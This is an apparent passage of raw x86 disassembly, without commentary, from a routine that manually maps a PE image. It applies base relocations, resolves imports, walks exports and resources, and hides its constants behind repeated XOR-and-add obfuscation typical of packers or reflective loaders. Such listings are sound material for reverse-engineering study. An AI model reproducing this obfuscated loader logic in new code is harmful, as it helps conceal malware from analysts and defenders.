  417cd3:	mov    DWORD PTR [ebp-0x6c],eax
  417cd6:	mov    DWORD PTR [ebp+0x1c],eax
  417cd9:	mov    DWORD PTR [edx],ecx
  417cdb:	mov    ecx,DWORD PTR [ebp-0x4]
  417cde:	mov    DWORD PTR [ecx],eax
  417ce0:	mov    eax,DWORD PTR [ebx+0x50]
  417ce3:	mov    DWORD PTR [ebp-0x68],eax
  417ce6:	mov    eax,DWORD PTR [ebp-0x1c]
  417ce9:	xor    eax,esi
  417ceb:	add    eax,edi
  417ced:	mov    DWORD PTR [ebp-0x64],eax
  417cf0:	lea    eax,[ebp-0x20]
  417cf3:	mov    DWORD PTR [ebp-0x60],eax
  417cf6:	lea    eax,[ebp-0x70]
  417cf9:	push   eax
  417cfa:	mov    eax,DWORD PTR [ebp+0x8]
  417cfd:	xor    eax,esi
  417cff:	add    eax,edi
  417d01:	push   eax
  417d02:	mov    eax,DWORD PTR [ebp+0x20]
  417d05:	add    eax,0xee
  417d0a:	push   eax
  417d0b:	mov    eax,DWORD PTR [ebp+0x20]
  417d0e:	mov    eax,DWORD PTR [eax+0x198]
  417d14:	mov    DWORD PTR [ebp-0x70],0x4
  417d1b:	push   DWORD PTR [eax]
  417d1d:	mov    eax,DWORD PTR [ebp+0x10]
  417d20:	call   eax
  417d22:	test   eax,eax
  417d24:	je     0x417d49
  417d26:	and    DWORD PTR [ebp+0xc],0x0
  417d2a:	cmp    DWORD PTR [ebx+0x50],0x0
  417d2e:	jbe    0x417d49
  417d30:	mov    eax,DWORD PTR [ebp+0x1c]
  417d33:	mov    ecx,DWORD PTR [ebp-0x10]
  417d36:	sub    ecx,eax
  417d38:	mov    dl,BYTE PTR [ecx+eax*1]
  417d3b:	inc    DWORD PTR [ebp+0xc]
  417d3e:	mov    BYTE PTR [eax],dl
  417d40:	mov    edx,DWORD PTR [ebp+0xc]
  417d43:	inc    eax
  417d44:	cmp    edx,DWORD PTR [ebx+0x50]
  417d47:	jb     0x417d38
  417d49:	mov    edx,DWORD PTR [ebp+0x1c]
  417d4c:	mov    ecx,DWORD PTR [edx+0x3c]
  417d4f:	add    ecx,edx
  417d51:	mov    eax,DWORD PTR [ecx+0xa0]
  417d57:	mov    ebx,DWORD PTR [ecx+0x28]
  417d5a:	add    eax,edx
  417d5c:	sub    edx,DWORD PTR [ebp-0x10]
  417d5f:	add    ebx,DWORD PTR [ebp+0x1c]
  417d62:	mov    DWORD PTR [ebp+0xc],edx
  417d65:	mov    DWORD PTR [ebp-0x2c],ecx
  417d68:	mov    DWORD PTR [ebp-0x14],ebx
  417d6b:	mov    DWORD PTR [ebp-0x8],0x0
  417d72:	jmp    0x417dee
  417d74:	add    edx,0xfffffff8
  417d77:	shr    edx,1
  417d79:	mov    DWORD PTR [ebp-0x18],edx
  417d7c:	je     0x417dda
  417d7e:	lea    edx,[eax+0x8]
  417d81:	mov    DWORD PTR [ebp-0x4],edx
  417d84:	mov    edx,DWORD PTR [ebp-0x18]
  417d87:	mov    DWORD PTR [ebp-0x18],edx
  417d8a:	mov    edx,DWORD PTR [ebp-0x4]
  417d8d:	movzx  edx,WORD PTR [edx]
  417d90:	mov    DWORD PTR [ebp-0x24],edx
  417d93:	and    edx,0xfff
  417d99:	mov    DWORD PTR [ebp-0x28],edx
  417d9c:	mov    edx,DWORD PTR [ebp-0x24]
  417d9f:	shr    edx,0xc
  417da2:	add    edx,0xffcd8d1e
  417da8:	xor    edx,esi
  417daa:	cmp    edx,0xf89c85ba
  417db0:	jne    0x417dd1
  417db2:	mov    edx,DWORD PTR [ebp-0x28]
  417db5:	add    edx,DWORD PTR [ebp+0x1c]
  417db8:	mov    ebx,DWORD PTR [eax]
  417dba:	cmp    DWORD PTR [ebx+edx*1],0x0
  417dbe:	je     0x417dce
  417dc0:	mov    ecx,DWORD PTR [ebp+0xc]
  417dc3:	add    ecx,DWORD PTR [ebx+edx*1]
  417dc6:	mov    ebx,DWORD PTR [eax]
  417dc8:	mov    DWORD PTR [edx+ebx*1],ecx
  417dcb:	mov    ecx,DWORD PTR [ebp-0x2c]
  417dce:	mov    ebx,DWORD PTR [ebp-0x14]
  417dd1:	add    DWORD PTR [ebp-0x4],0x2
  417dd5:	dec    DWORD PTR [ebp-0x18]
  417dd8:	jne    0x417d8a
  417dda:	mov    edx,DWORD PTR [ebp-0xc]
  417ddd:	add    DWORD PTR [ebp-0x8],edx
  417de0:	mov    edx,DWORD PTR [ebp-0x8]
  417de3:	cmp    edx,DWORD PTR [ecx+0xa4]
  417de9:	jae    0x417dfc
  417deb:	add    eax,DWORD PTR [ebp-0xc]
  417dee:	mov    edx,DWORD PTR [eax+0x4]
  417df1:	mov    DWORD PTR [ebp-0xc],edx
  417df4:	test   edx,edx
  417df6:	jne    0x417d74
  417dfc:	mov    eax,DWORD PTR [ebp-0x10]
  417dff:	mov    DWORD PTR [ebp-0x6c],eax
  417e02:	mov    DWORD PTR [ebp-0x70],0x4
  417e09:	mov    eax,DWORD PTR [ecx+0x50]
  417e0c:	mov    DWORD PTR [ebp-0x68],eax
  417e0f:	mov    eax,DWORD PTR [ebp-0x1c]
  417e12:	xor    eax,esi
  417e14:	add    eax,edi
  417e16:	mov    DWORD PTR [ebp-0x64],eax
  417e19:	lea    eax,[ebp-0x20]
  417e1c:	mov    DWORD PTR [ebp-0x60],eax
  417e1f:	lea    eax,[ebp-0x70]
  417e22:	push   eax
  417e23:	mov    eax,DWORD PTR [ebp+0x8]
  417e26:	xor    eax,esi
  417e28:	add    eax,edi
  417e2a:	push   eax
  417e2b:	mov    eax,DWORD PTR [ebp+0x20]
  417e2e:	add    eax,0xee
  417e33:	push   eax
  417e34:	mov    eax,DWORD PTR [ebp+0x20]
  417e37:	mov    eax,DWORD PTR [eax+0x198]
  417e3d:	push   DWORD PTR [eax]
  417e3f:	mov    eax,DWORD PTR [ebp+0x10]
  417e42:	call   eax
  417e44:	mov    eax,DWORD PTR [ebp+0x20]
  417e47:	mov    eax,DWORD PTR [eax+0x180]
  417e4d:	add    eax,DWORD PTR [ebp+0xc]
  417e50:	mov    ecx,DWORD PTR [ebp+0xc]
  417e53:	push   DWORD PTR [ebp+0x18]
  417e56:	mov    DWORD PTR [eax],ecx
  417e58:	push   DWORD PTR [ebp+0x14]
  417e5b:	push   DWORD PTR [ebp+0x1c]
  417e5e:	call   ebx
  417e60:	mov    ecx,DWORD PTR [ebp+0xc]
  417e63:	add    ecx,DWORD PTR [ebp+0x20]
  417e66:	lea    eax,[ebp+0x4]
  417e69:	mov    DWORD PTR [ebp+0x20],ecx
  417e6c:	mov    ecx,DWORD PTR [ebp+0x20]
  417e6f:	mov    ecx,DWORD PTR [ebp+0x20]
  417e72:	mov    edx,DWORD PTR [ecx+0x190]
  417e78:	mov    ecx,DWORD PTR [ebp+0x20]
  417e7b:	mov    ecx,DWORD PTR [ecx+0x18c]
  417e81:	mov    esi,DWORD PTR [ecx]
  417e83:	cmp    DWORD PTR [eax],esi
  417e85:	jb     0x417ea6
  417e87:	mov    esi,DWORD PTR [edx]
  417e89:	mov    edi,DWORD PTR [edx]
  417e8b:	mov    esi,DWORD PTR [esi+0x3c]
  417e8e:	lea    esi,[edi+esi*1+0x50]
  417e92:	mov    edi,DWORD PTR [ecx]
  417e94:	add    edi,DWORD PTR [esi]
  417e96:	cmp    DWORD PTR [eax],edi
  417e98:	jae    0x417ea6
  417e9a:	mov    esi,DWORD PTR [ecx]
  417e9c:	mov    ecx,DWORD PTR [eax]
  417e9e:	mov    edx,DWORD PTR [edx]
  417ea0:	sub    ecx,esi
  417ea2:	add    edx,ecx
  417ea4:	mov    DWORD PTR [eax],edx
  417ea6:	mov    eax,DWORD PTR [ebp+0xc]
  417ea9:	jmp    0x417ead
  417eab:	xor    eax,eax
  417ead:	pop    edi
  417eae:	pop    esi
  417eaf:	pop    ebx
  417eb0:	leave  
  417eb1:	ret    0x1c
  417eb4:	push   ebp
  417eb5:	mov    ebp,esp
  417eb7:	sub    esp,0x1c
  417eba:	push   esi
  417ebb:	mov    esi,eax
  417ebd:	mov    eax,DWORD PTR [ecx+0x190]
  417ec3:	cmp    DWORD PTR [eax],0x0
  417ec6:	je     0x417fd6
  417ecc:	test   edx,edx
  417ece:	je     0x417fd6
  417ed4:	test   esi,esi
  417ed6:	je     0x417fd6
  417edc:	mov    eax,DWORD PTR [esi+0x88]
  417ee2:	test   eax,eax
  417ee4:	je     0x417fd1
  417eea:	cmp    DWORD PTR [esi+0x8c],0x10
  417ef1:	je     0x417fd1
  417ef7:	cmp    DWORD PTR [esi+0x34],edx
  417efa:	je     0x417fd1
  417f00:	mov    esi,DWORD PTR [ecx+0x18c]
  417f06:	and    DWORD PTR [ebp-0x10],0x0
  417f0a:	mov    ecx,edx
  417f0c:	sub    ecx,DWORD PTR [esi]
  417f0e:	add    eax,edx
  417f10:	movzx  edx,WORD PTR [eax+0xc]
  417f14:	mov    DWORD PTR [ebp-0x1c],ecx
  417f17:	movzx  ecx,WORD PTR [eax+0xe]
  417f1b:	add    ecx,edx
  417f1d:	je     0x417fd1
  417f23:	lea    ecx,[eax+0x14]
  417f26:	push   ebx
  417f27:	mov    DWORD PTR [ebp-0x18],ecx
  417f2a:	mov    esi,0x7fffffff
  417f2f:	push   edi
  417f30:	test   DWORD PTR [ecx],esi
  417f32:	je     0x417fb3
  417f34:	mov    edx,DWORD PTR [ecx]
  417f36:	and    DWORD PTR [ebp-0xc],0x0
  417f3a:	and    edx,esi
  417f3c:	add    edx,eax
  417f3e:	movzx  edi,WORD PTR [edx+0xe]
  417f42:	movzx  ebx,WORD PTR [edx+0xc]
  417f46:	add    edi,ebx
  417f48:	je     0x417fb3
  417f4a:	lea    ecx,[edx+0x14]
  417f4d:	mov    DWORD PTR [ebp-0x14],ecx
  417f50:	test   DWORD PTR [ecx],esi
  417f52:	je     0x417f95
  417f54:	mov    ecx,DWORD PTR [ecx]
  417f56:	and    DWORD PTR [ebp-0x8],0x0
  417f5a:	and    ecx,esi
  417f5c:	add    ecx,eax
  417f5e:	movzx  edi,WORD PTR [ecx+0xe]
  417f62:	movzx  ebx,WORD PTR [ecx+0xc]
  417f66:	add    edi,ebx
  417f68:	je     0x417f95
  417f6a:	lea    edi,[ecx+0x14]
  417f6d:	mov    DWORD PTR [ebp-0x4],edi
  417f70:	mov    edi,DWORD PTR [ebp-0x4]
  417f73:	mov    edi,DWORD PTR [edi]
  417f75:	test   edi,edi
  417f77:	je     0x417f7f
  417f79:	mov    ebx,DWORD PTR [ebp-0x1c]
  417f7c:	add    DWORD PTR [edi+eax*1],ebx
  417f7f:	movzx  edi,WORD PTR [ecx+0xe]
  417f83:	movzx  ebx,WORD PTR [ecx+0xc]
  417f87:	inc    DWORD PTR [ebp-0x8]
  417f8a:	add    DWORD PTR [ebp-0x4],0x8
  417f8e:	add    edi,ebx
  417f90:	cmp    DWORD PTR [ebp-0x8],edi
  417f93:	jb     0x417f70
  417f95:	movzx  edi,WORD PTR [edx+0xe]
  417f99:	movzx  ebx,WORD PTR [edx+0xc]
  417f9d:	mov    ecx,DWORD PTR [ebp-0x14]
  417fa0:	inc    DWORD PTR [ebp-0xc]
  417fa3:	add    ecx,0x8
  417fa6:	add    edi,ebx
  417fa8:	mov    DWORD PTR [ebp-0x14],ecx
  417fab:	cmp    DWORD PTR [ebp-0xc],edi
  417fae:	jb     0x417f50
  417fb0:	mov    ecx,DWORD PTR [ebp-0x18]
  417fb3:	movzx  edx,WORD PTR [eax+0xe]
  417fb7:	movzx  edi,WORD PTR [eax+0xc]
  417fbb:	inc    DWORD PTR [ebp-0x10]
  417fbe:	add    ecx,0x8
  417fc1:	add    edx,edi
  417fc3:	mov    DWORD PTR [ebp-0x18],ecx
  417fc6:	cmp    DWORD PTR [ebp-0x10],edx
  417fc9:	jb     0x417f30
  417fcf:	pop    edi
  417fd0:	pop    ebx
  417fd1:	xor    eax,eax
  417fd3:	inc    eax
  417fd4:	jmp    0x417fd8
  417fd6:	xor    eax,eax
  417fd8:	pop    esi
  417fd9:	leave  
  417fda:	ret    
  417fdb:	push   ebp
  417fdc:	mov    ebp,esp
  417fde:	mov    ecx,DWORD PTR [ecx+0x190]
  417fe4:	mov    eax,DWORD PTR [ebp+0xc]
  417fe7:	sub    esp,0x10
  417fea:	push   ebx
  417feb:	xor    ebx,ebx
  417fed:	push   esi
  417fee:	push   edi
  417fef:	cmp    DWORD PTR [ecx],ebx
  417ff1:	je     0x418079
  417ff7:	cmp    eax,ebx
  417ff9:	je     0x418079
  417ffb:	cmp    DWORD PTR [eax+0x78],ebx
  417ffe:	jne    0x418005
  418000:	xor    eax,eax
  418002:	inc    eax
  418003:	jmp    0x41807b
  418005:	mov    eax,DWORD PTR [eax+0x78]
  418008:	add    eax,DWORD PTR [ebp+0x8]
  41800b:	mov    ecx,DWORD PTR [eax+0x1c]
  41800e:	mov    edx,DWORD PTR [eax+0x24]
  418011:	mov    esi,DWORD PTR [eax+0x14]
  418014:	mov    edi,DWORD PTR [eax+0x18]
  418017:	add    ecx,DWORD PTR [ebp+0x8]
  41801a:	add    edx,DWORD PTR [ebp+0x8]
  41801d:	mov    DWORD PTR [ebp-0x4],esi
  418020:	cmp    esi,edi
  418022:	ja     0x418027
  418024:	mov    DWORD PTR [ebp-0x4],edi
  418027:	mov    DWORD PTR [ebp-0x8],ebx
  41802a:	cmp    DWORD PTR [ebp-0x4],ebx
  41802d:	jbe    0x418000
  41802f:	cmp    ebx,DWORD PTR [eax+0x14]
  418032:	jae    0x41803a
  418034:	movzx  esi,WORD PTR [edx+ebx*2]
  418038:	jmp    0x41803c
  41803a:	mov    esi,ebx
  41803c:	lea    esi,[ecx+esi*4]
  41803f:	mov    edi,DWORD PTR [esi]
  418041:	test   edi,edi
  418043:	je     0x41806e
  418045:	add    edi,DWORD PTR [ebp+0x8]
  418048:	mov    DWORD PTR [ebp-0x10],edi
  41804b:	cmp    edi,eax
  41804d:	jbe    0x41805f
  41804f:	mov    ebx,DWORD PTR [ebp+0xc]
  418052:	mov    ebx,DWORD PTR [ebx+0x7c]
  418055:	add    ebx,eax
  418057:	cmp    edi,ebx
  418059:	jae    0x41805f
  41805b:	mov    esi,DWORD PTR [esi]
  41805d:	jmp    0x418067
  41805f:	sub    edi,DWORD PTR [ebp+0x8]
  418062:	mov    DWORD PTR [esi],edi
  418064:	mov    esi,DWORD PTR [ebp-0x10]
  418067:	test   esi,esi
  418069:	je     0x418079
  41806b:	mov    ebx,DWORD PTR [ebp-0x8]
  41806e:	inc    ebx
  41806f:	mov    DWORD PTR [ebp-0x8],ebx
  418072:	cmp    ebx,DWORD PTR [ebp-0x4]
  418075:	jb     0x41802f
  418077:	jmp    0x418000
  418079:	xor    eax,eax
  41807b:	pop    edi
  41807c:	pop    esi
  41807d:	pop    ebx
  41807e:	leave  
  41807f:	ret    0x8
  418082:	push   ebp
  418083:	mov    ebp,esp
  418085:	sub    esp,0x2c
  418088:	mov    edx,0xf89c8585
  41808d:	mov    DWORD PTR [ebp-0x4],edx
  418090:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418097:	mov    eax,DWORD PTR [ebp-0x4]
  41809a:	mov    ecx,DWORD PTR [ebp-0x4]
  41809d:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4180a9:	push   ebx
  4180aa:	mov    ebx,DWORD PTR [ebp+0x10]
  4180ad:	push   esi
  4180ae:	mov    esi,0x751089b
  4180b3:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4180ba:	mov    ecx,DWORD PTR [ebp-0x4]
  4180bd:	mov    ebx,DWORD PTR [ebx+0x190]
  4180c3:	push   edi
  4180c4:	mov    edi,0x3272e2
  4180c9:	xor    ecx,esi
  4180cb:	xor    eax,esi
  4180cd:	add    eax,edi
  4180cf:	add    ecx,edi
  4180d1:	mov    DWORD PTR [ebp-0x18],eax
  4180d4:	cmp    ecx,DWORD PTR [ebx]
  4180d6:	je     0x418357
  4180dc:	mov    ebx,DWORD PTR [ebp-0x4]
  4180df:	mov    ecx,DWORD PTR [ebp+0xc]
  4180e2:	xor    ebx,esi
  4180e4:	add    ebx,edi
  4180e6:	cmp    ebx,ecx
  4180e8:	je     0x418357
  4180ee:	mov    ebx,DWORD PTR [ebp-0x4]
  4180f1:	mov    ecx,DWORD PTR [ecx+0x80]
  4180f7:	xor    ebx,esi
  4180f9:	add    ebx,edi
  4180fb:	cmp    ecx,ebx
  4180fd:	je     0x418352
  418103:	add    ecx,DWORD PTR [ebp+0x8]
  418106:	mov    DWORD PTR [ebp-0x2c],ecx
  418109:	mov    ebx,edx
  41810b:	xor    ebx,esi
  41810d:	add    ebx,edi
  41810f:	mov    DWORD PTR [ebp-0x10],ebx
  418112:	mov    ebx,DWORD PTR [ebp-0x10]
  418115:	cmp    ebx,edx
  418117:	je     0x41812b
  418119:	mov    edx,DWORD PTR [ebp-0x10]
  41811c:	mov    ebx,DWORD PTR [ebp-0x4]
  41811f:	imul   edx,edx,0x14
  418122:	xor    ebx,esi
  418124:	add    ebx,edi
  418126:	cmp    DWORD PTR [edx+ecx*1],ebx
  418129:	jne    0x418142
  41812b:	mov    edx,DWORD PTR [ebp-0x10]
  41812e:	mov    ebx,DWORD PTR [ebp-0x4]
  418131:	imul   edx,edx,0x14
  418134:	xor    ebx,esi
  418136:	add    ebx,edi
  418138:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41813c:	je     0x418344
  418142:	mov    eax,DWORD PTR [ebp-0x4]
  418145:	mov    ebx,DWORD PTR [ebp-0x4]
  418148:	mov    eax,DWORD PTR [ebp-0x10]
  41814b:	imul   eax,eax,0x14
  41814e:	add    eax,ecx
  418150:	mov    ecx,DWORD PTR [eax+0x10]
  418153:	add    ecx,DWORD PTR [ebp+0x8]
  418156:	xor    ebx,esi
  418158:	mov    DWORD PTR [ebp-0x1c],ecx
  41815b:	mov    ecx,DWORD PTR [ebp-0x4]
  41815e:	mov    edx,DWORD PTR [ebp-0x4]
  418161:	xor    ecx,esi
  418163:	add    ecx,edi
  418165:	xor    edx,esi
  418167:	mov    DWORD PTR [ebp-0x24],ecx
  41816a:	mov    ecx,DWORD PTR [eax]
  41816c:	add    edx,edi
  41816e:	add    ebx,edi
  418170:	cmp    ecx,edx
  418172:	je     0x41817a
  418174:	add    ecx,DWORD PTR [ebp+0x8]
  418177:	mov    DWORD PTR [ebp-0x24],ecx
  41817a:	mov    ecx,DWORD PTR [ebp-0x4]
  41817d:	xor    ecx,esi
  41817f:	add    ecx,DWORD PTR [eax+0xc]
  418182:	mov    eax,DWORD PTR [ebp+0x8]
  418185:	lea    eax,[ecx+eax*1+0x3272e2]
  41818c:	mov    DWORD PTR [ebp+0xc],eax
  41818f:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  418196:	mov    eax,DWORD PTR [ebp+0x10]
  418199:	push   DWORD PTR [ebp+0xc]
  41819c:	mov    eax,DWORD PTR [eax+0x1d8]
  4181a2:	call   DWORD PTR [eax]
  4181a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4181a7:	xor    ecx,esi
  4181a9:	add    ecx,edi
  4181ab:	mov    DWORD PTR [ebp-0xc],eax
  4181ae:	cmp    ecx,eax
  4181b0:	jne    0x4181c4
  4181b2:	mov    eax,DWORD PTR [ebp+0x10]
  4181b5:	push   DWORD PTR [ebp+0xc]
  4181b8:	mov    eax,DWORD PTR [eax+0x1d8]
  4181be:	call   DWORD PTR [eax+0xc]
  4181c1:	mov    DWORD PTR [ebp-0xc],eax
  4181c4:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  4181cb:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  4181d2:	mov    eax,DWORD PTR [ebp-0x4]
  4181d5:	xor    eax,esi
  4181d7:	add    eax,edi
  4181d9:	cmp    eax,DWORD PTR [ebp-0xc]
  4181dc:	jne    0x418201
  4181de:	mov    eax,DWORD PTR [ebp-0x8]
  4181e1:	mov    ecx,DWORD PTR [ebp-0x20]
  4181e4:	xor    eax,esi
  4181e6:	xor    ecx,esi
  4181e8:	lea    ebx,[ebx+eax*1+0x3272e2]
  4181ef:	mov    eax,DWORD PTR [ebp+0x10]
  4181f2:	mov    eax,DWORD PTR [eax+0x1d8]
  4181f8:	add    ecx,edi
  4181fa:	imul   ecx,ebx
  4181fd:	push   ecx
  4181fe:	call   DWORD PTR [eax+0x24]
  418201:	mov    eax,DWORD PTR [ebp-0x4]
  418204:	xor    eax,esi
  418206:	add    eax,edi
  418208:	cmp    eax,DWORD PTR [ebp-0xc]
  41820b:	jne    0x41821c
  41820d:	mov    eax,DWORD PTR [ebp-0x28]
  418210:	xor    eax,esi
  418212:	add    eax,edi
  418214:	cmp    ebx,eax
  418216:	jbe    0x418196
  41821c:	mov    eax,DWORD PTR [ebp-0x4]
  41821f:	xor    eax,esi
  418221:	add    eax,edi
  418223:	cmp    eax,DWORD PTR [ebp-0xc]
  418226:	jne    0x41823f
  418228:	mov    eax,DWORD PTR [ebp-0x8]
  41822b:	mov    ecx,DWORD PTR [ebp-0x18]
  41822e:	xor    eax,esi
  418230:	lea    eax,[ecx+eax*1+0x3272e2]
  418237:	mov    DWORD PTR [ebp-0x18],eax
  41823a:	jmp    0x41832e
  41823f:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  418246:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41824d:	mov    ebx,DWORD PTR [ebp-0x4]
  418250:	xor    ebx,esi
  418252:	add    ebx,edi
  418254:	jmp    0x41831b
  418259:	mov    eax,DWORD PTR [ebp-0x4]
  41825c:	xor    eax,esi
  41825e:	add    eax,edi
  418260:	mov    DWORD PTR [ebp-0x14],eax
  418263:	mov    eax,DWORD PTR [ebp-0x4]
  418266:	xor    eax,esi
  418268:	add    eax,edi
  41826a:	mov    DWORD PTR [ebp+0xc],eax
  41826d:	mov    ecx,DWORD PTR [ebp-0x4]
  418270:	mov    eax,DWORD PTR [ebp-0x24]
  418273:	xor    ecx,esi
  418275:	add    ecx,edi
  418277:	cmp    ecx,eax
  418279:	je     0x418281
  41827b:	mov    eax,DWORD PTR [eax+ebx*4]
  41827e:	mov    DWORD PTR [ebp-0x14],eax
  418281:	mov    eax,DWORD PTR [ebp-0x1c]
  418284:	mov    eax,DWORD PTR [eax+ebx*4]
  418287:	mov    DWORD PTR [ebp+0xc],eax
  41828a:	mov    eax,DWORD PTR [ebp-0x4]
  41828d:	mov    ecx,DWORD PTR [ebp-0x14]
  418290:	xor    eax,esi
  418292:	add    eax,edi
  418294:	cmp    eax,ecx
  418296:	je     0x4182c1
  418298:	mov    eax,DWORD PTR [ebp-0x4]
  41829b:	mov    ecx,DWORD PTR [ebp-0x14]
  41829e:	xor    eax,esi
  4182a0:	add    eax,edi
  4182a2:	shr    ecx,0x1f
  4182a5:	cmp    eax,ecx
  4182a7:	je     0x4182c1
  4182a9:	mov    ecx,DWORD PTR [ebp-0x14]
  4182ac:	mov    eax,DWORD PTR [ebp+0x10]
  4182af:	mov    eax,DWORD PTR [eax+0x1d8]
  4182b5:	movzx  ecx,cx
  4182b8:	push   ecx
  4182b9:	push   DWORD PTR [ebp-0xc]
  4182bc:	call   DWORD PTR [eax+0x8]
  4182bf:	jmp    0x4182da
  4182c1:	mov    eax,DWORD PTR [ebp+0xc]
  4182c4:	add    eax,DWORD PTR [ebp+0x8]
  4182c7:	mov    ecx,DWORD PTR [ebp+0x10]
  4182ca:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4182d0:	add    eax,0x2
  4182d3:	push   eax
  4182d4:	push   DWORD PTR [ebp-0xc]
  4182d7:	call   DWORD PTR [ecx+0x8]
  4182da:	mov    DWORD PTR [ebp+0xc],eax
  4182dd:	mov    eax,DWORD PTR [ebp-0x4]
  4182e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4182e3:	xor    eax,esi
  4182e5:	add    eax,edi
  4182e7:	cmp    eax,ecx
  4182e9:	mov    eax,DWORD PTR [ebp-0x8]
  4182ec:	jne    0x4182ff
  4182ee:	mov    ecx,DWORD PTR [ebp-0x18]
  4182f1:	xor    eax,esi
  4182f3:	lea    eax,[ecx+eax*1+0x3272e2]
  4182fa:	mov    DWORD PTR [ebp-0x18],eax
  4182fd:	jmp    0x41830f
  4182ff:	mov    ecx,DWORD PTR [ebp+0xc]
  418302:	xor    eax,esi
  418304:	add    eax,edi
  418306:	imul   eax,ecx
  418309:	mov    ecx,DWORD PTR [ebp-0x1c]
  41830c:	mov    DWORD PTR [ecx+ebx*4],eax
  41830f:	mov    eax,DWORD PTR [ebp-0x8]
  418312:	xor    eax,esi
  418314:	lea    ebx,[ebx+eax*1+0x3272e2]
  41831b:	mov    eax,DWORD PTR [ebp-0x4]
  41831e:	mov    ecx,DWORD PTR [ebp-0x1c]
  418321:	xor    eax,esi
  418323:	add    eax,edi
  418325:	cmp    DWORD PTR [ecx+ebx*4],eax
  418328:	jne    0x418259
  41832e:	mov    edx,DWORD PTR [ebp-0x10]
  418331:	mov    eax,DWORD PTR [ebp-0x18]
  418334:	mov    ecx,DWORD PTR [ebp-0x2c]
  418337:	sub    edx,0x3272e1
  41833d:	xor    edx,esi
  41833f:	jmp    0x418109
  418344:	mov    ecx,DWORD PTR [ebp-0x4]
  418347:	xor    ecx,esi
  418349:	add    ecx,edi
  41834b:	cmp    eax,ecx
  41834d:	mov    eax,DWORD PTR [ebp-0x4]
  418350:	jne    0x41835a
  418352:	mov    eax,DWORD PTR [ebp-0x8]
  418355:	jmp    0x41835a
  418357:	mov    eax,DWORD PTR [ebp-0x4]
  41835a:	xor    eax,esi
  41835c:	add    eax,edi
  41835e:	pop    edi
  41835f:	pop    esi
  418360:	pop    ebx
  418361:	leave  
  418362:	ret    0xc
  418365:	push   ebp
  418366:	mov    ebp,esp
  418368:	sub    esp,0x28
  41836b:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418372:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  418379:	mov    eax,DWORD PTR [ebp+0xc]
  41837c:	mov    DWORD PTR [ebp+0xc],eax
  41837f:	push   esi
  418380:	mov    eax,eax
  418382:	mov    eax,DWORD PTR [ebp-0x4]
  418385:	mov    esi,DWORD PTR [ebp+0x8]
  418388:	mov    ecx,0x751089b
  41838d:	xor    eax,ecx
  41838f:	mov    edx,0x3272e2
  418394:	add    eax,edx
  418396:	cmp    esi,eax
  418398:	je     0x4184bf
  41839e:	mov    eax,DWORD PTR [ebp+0x8]
  4183a1:	mov    esi,DWORD PTR [ebp+0x8]
  4183a4:	add    esi,DWORD PTR [eax+0x3c]
  4183a7:	push   edi
  4183a8:	mov    DWORD PTR [ebp+0xc],esi
  4183ab:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  4183b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4183b5:	mov    esi,DWORD PTR [ebp-0x4]
  4183b8:	mov    edi,DWORD PTR [ebp+0xc]
  4183bb:	xor    esi,ecx
  4183bd:	xor    eax,ecx
  4183bf:	add    esi,edx
  4183c1:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  4183c8:	je     0x4184b9
  4183ce:	mov    esi,DWORD PTR [ebp+0xc]
  4183d1:	mov    eax,DWORD PTR [ebp+0x8]
  4183d4:	add    eax,DWORD PTR [esi+0xa0]
  4183da:	mov    esi,DWORD PTR [ebp+0x8]
  4183dd:	mov    edi,DWORD PTR [ebp+0xc]
  4183e0:	sub    esi,DWORD PTR [edi+0x34]
  4183e3:	mov    edi,DWORD PTR [ebp-0x4]
  4183e6:	xor    edi,ecx
  4183e8:	add    edi,edx
  4183ea:	mov    DWORD PTR [ebp-0x24],esi
  4183ed:	cmp    esi,edi
  4183ef:	je     0x4184b9
  4183f5:	mov    esi,DWORD PTR [ebp-0x4]
  4183f8:	xor    esi,ecx
  4183fa:	add    esi,edx
  4183fc:	mov    DWORD PTR [ebp-0x8],esi
  4183ff:	push   ebx
  418400:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  418407:	jmp    0x4184a3
  41840c:	mov    esi,DWORD PTR [ebp-0x4]
  41840f:	xor    esi,ecx
  418411:	lea    edi,[ebx-0x8]
  418414:	add    esi,edx
  418416:	shr    edi,1
  418418:	cmp    esi,edi
  41841a:	jae    0x418489
  41841c:	sub    edi,esi
  41841e:	lea    ebx,[eax+esi*2+0x8]
  418422:	mov    DWORD PTR [ebp-0x18],edi
  418425:	movzx  esi,WORD PTR [ebx]
  418428:	and    esi,0xfff
  41842e:	mov    DWORD PTR [ebp-0x14],esi
  418431:	mov    edi,DWORD PTR [ebp-0x14]
  418434:	mov    esi,DWORD PTR [eax]
  418436:	sub    esi,edx
  418438:	add    edi,esi
  41843a:	movzx  esi,WORD PTR [ebx]
  41843d:	shr    esi,0xc
  418440:	xor    edi,ecx
  418442:	mov    DWORD PTR [ebp-0x20],edi
  418445:	mov    DWORD PTR [ebp-0x14],esi
  418448:	mov    esi,DWORD PTR [ebp-0x20]
  41844b:	mov    edi,DWORD PTR [ebp+0x8]
  41844e:	xor    esi,ecx
  418450:	lea    esi,[esi+edi*1+0x3272e2]
  418457:	mov    DWORD PTR [ebp-0x20],esi
  41845a:	mov    esi,DWORD PTR [ebp-0x10]
  41845d:	mov    edi,DWORD PTR [ebp-0x14]
  418460:	xor    esi,ecx
  418462:	add    esi,edx
  418464:	cmp    edi,esi
  418466:	jne    0x41847e
  418468:	mov    esi,DWORD PTR [ebp-0x10]
  41846b:	mov    edi,DWORD PTR [ebp-0x14]
  41846e:	xor    esi,ecx
  418470:	add    esi,edx
  418472:	cmp    edi,esi
